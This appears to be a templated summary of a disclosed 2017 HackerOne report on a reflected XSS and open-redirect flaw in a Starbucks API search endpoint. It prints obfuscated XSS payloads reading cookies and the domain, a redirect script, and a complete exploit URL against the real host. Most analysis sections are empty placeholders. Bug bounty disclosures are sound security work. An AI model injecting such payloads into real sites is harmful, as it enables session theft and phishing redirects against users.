# Reflected XSS in openapi.starbucks.com /searchasyoutype/v1/search?x-api-key=

## Metadata
- **Source:** HackerOne
- **Report:** 213190 | https://hackerone.com/reports/213190
- **Submitted:** 2017-03-13
- **Reporter:** an0n-j
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hi Starbucks team,
While testing i founded Reflected XSS in openapi.starbucks.com that can also lead to Open redirect
Vulnerable link
==========
https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=
Vulnerable parameter
===============
siteBaseUrl
Payloads
======
```1). http://googl.com/%0a<body onload=%61lert(%64ocument.%63ook

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Starbucks team,
While testing i founded Reflected XSS in openapi.starbucks.com that can also lead to Open redirect
Vulnerable link
==========
https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=
Vulnerable parameter
===============
siteBaseUrl
Payloads
======
```1). http://googl.com/%0a<body onload=%61lert(%64ocument.%63ookie)>%
2). http://googl.com/%0a<body onload=prompt(%64ocument.domain)>%```
For Open redirect the payload is
=====================
```
http://googl.com/%0a<script>window.location='https://google.com';</script>%
```

So the finalized link with payload is given below
```
https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a<body onload=%61lert(%64ocument.%63ookie)>%
```

POC has been attached

</details>

---
*Analysed by Claude on 2026-05-24*
